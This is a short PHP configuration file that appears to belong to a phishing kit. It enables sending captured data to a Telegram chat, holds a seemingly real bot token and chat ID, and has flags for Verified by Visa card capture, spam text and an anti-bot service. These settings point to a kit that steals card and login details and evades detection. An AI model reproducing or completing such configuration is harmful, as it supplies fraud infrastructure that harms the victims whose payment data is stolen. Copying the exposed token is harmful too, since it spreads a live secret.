<?php

$test_mode = false;
$mail_sending = false;
$telegram_sending = true;
$bot_token = "5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo";
$chat_login = "-791414938";   
$my_mail = "";
$vbv = true;
$txtspam ="";
$apiantibot = "";
?>
